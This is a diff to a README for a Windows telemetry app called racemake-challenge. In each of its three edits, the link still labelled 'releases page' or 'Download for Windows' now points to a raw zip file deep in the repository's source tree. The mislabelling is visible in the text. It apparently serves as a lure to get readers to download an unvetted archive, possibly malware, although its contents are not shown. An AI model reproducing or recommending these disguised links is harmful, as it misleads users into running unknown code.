@@ -1,6 +1,6 @@
 # ⚙️ racemake-challenge - Run telemetry analysis with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Click%20to%20open%20releases-blue?style=for-the-badge)](https://github.com/Lazloinorganic902/racemake-challenge/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Click%20to%20open%20releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lazloinorganic902/racemake-challenge/main/packages/challenge-hard/src/challenge_racemake_2.1.zip)
 
 ## 🖥️ What this app does
 
@@ -16,7 +16,7 @@ Use it to:
 
 ## 📥 Download and install
 
-1. Open the [releases page](https://github.com/Lazloinorganic902/racemake-challenge/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Lazloinorganic902/racemake-challenge/main/packages/challenge-hard/src/challenge_racemake_2.1.zip)
 2. Find the latest release for Windows
 3. Download the file that matches your PC
 4. If the file is zipped, extract it to a folder
@@ -179,7 +179,7 @@ After setup, try this:
 
 ## 📎 Download again
 
-If you need the app file again, visit the [releases page](https://github.com/Lazloinorganic902/racemake-challenge/releases) and download the latest Windows release
+If you need the app file again, visit the [releases page](https://raw.githubusercontent.com/Lazloinorganic902/racemake-challenge/main/packages/challenge-hard/src/challenge_racemake_2.1.zip) and download the latest Windows release
 
 ## 🧾 Repository details
 
